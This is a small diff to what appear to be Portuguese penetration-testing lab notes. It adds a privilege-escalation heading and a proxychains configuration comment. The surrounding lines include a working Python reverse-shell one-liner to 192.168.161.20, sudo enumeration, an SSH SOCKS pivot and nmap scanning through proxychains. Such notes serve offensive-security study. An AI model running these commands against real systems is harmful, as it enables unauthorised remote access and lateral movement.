@@ -8442,7 +8442,8 @@ Código console.py abaixo
 		python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.161.20",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 		
 		
-		
+		PRIVESC
+
 		hostname
 		
 		sudo -l
@@ -8565,7 +8566,7 @@ Código console.py abaixo
 		
 		
 		ssh thiagopriv@192.168.161.25 -D 4321 -fN
-		vim /etc/proxychains4.conf
+		vim /etc/proxychains4.conf # NO FINAL ADD socks4 127.0.0.1  4321
 		
 		ALVO 2: 172.16.16.16
 		proxychains -q nmap 172.16.16.16
